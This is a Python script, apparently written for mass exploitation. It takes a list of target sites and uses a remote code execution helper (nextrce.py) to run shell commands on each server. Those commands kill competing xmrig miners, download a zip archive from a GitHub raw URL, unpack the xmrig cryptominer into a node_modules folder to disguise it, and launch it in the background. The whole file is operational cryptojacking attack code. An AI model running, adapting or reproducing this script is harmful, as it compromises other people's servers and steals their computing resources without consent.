import subprocess
import time

SITELIST = "z.txt"
SUCCESS_MARK = "Scan completed"

INSTALL_COMMANDS = [
    "pkill -9 -f xmrig",
    "apt update -y",
    "apt install curl -y",
    "apt install wget -y",
    "apt install unzip -y",
    "mkdir -p node_modules"
]

CURL_CMD = "curl -L https://raw.githubusercontent.com/animejawa/tail/refs/heads/main/zzx.zip -o node_modules/zzx.zip"
WGET_CMD = "wget -O node_modules/zzx.zip https://raw.githubusercontent.com/animejawa/tail/refs/heads/main/zzx.zip"

POST_COMMANDS = [
    "unzip node_modules/zzx.zip -d node_modules",
    "chmod +x node_modules/xmrig",
    "nohup node_modules/xmrig --config config.json >> node_modules/xmrig1.log 2>&1 &",
    "ps aux | grep xmrig | grep -v grep"
]


def run_remote(url, cmd):
    try:
        process = subprocess.run(
            ["python3", "nextrce.py", "-u", url, "-c", cmd],
            capture_output=True,
            text=True,
            timeout=180
        )
        return process.stdout + process.stderr
    except Exception as e:
        return str(e)


def run_and_wait(url, cmd, retries=5):
    print(f"[>] {cmd}")

    for attempt in range(retries):
        output = run_remote(url, cmd)
        print(output)

        if SUCCESS_MARK in output:
            print("[✓] Scan completed detected.\n")
            return True

        print(f"[!] Marker belum muncul, retry {attempt+1}/{retries}...")
        time.sleep(3)

    print("[!] Marker tidak pernah muncul. Tetap lanjut.\n")
    return False


with open(SITELIST, "r") as f:
    sites = [line.strip() for line in f if line.strip()]

for url in sites:
    print(f"\n==============================")
    print(f"[+] Processing {url}")
    print(f"==============================")

    # ======================
    # INSTALL & KILL MINER
    # ======================
    for cmd in INSTALL_COMMANDS:
        run_and_wait(url, cmd)

    # ======================
    # CURL DOWNLOAD
    # ======================
    run_and_wait(url, CURL_CMD)

    # ======================
    # CEK FILE
    # ======================
    ls_output = run_remote(url, "ls -la node_modules")

    if "zzx.zip" not in ls_output:
        print("[!] zzx.zip tidak ada setelah curl. Coba wget...")
        run_and_wait(url, WGET_CMD)

    # ======================
    # POST COMMANDS
    # ======================
    for cmd in POST_COMMANDS:
        run_and_wait(url, cmd)

    print(f"[✓] Done {url}")

print("\n=== SEMUA SERVER SELESAI ===")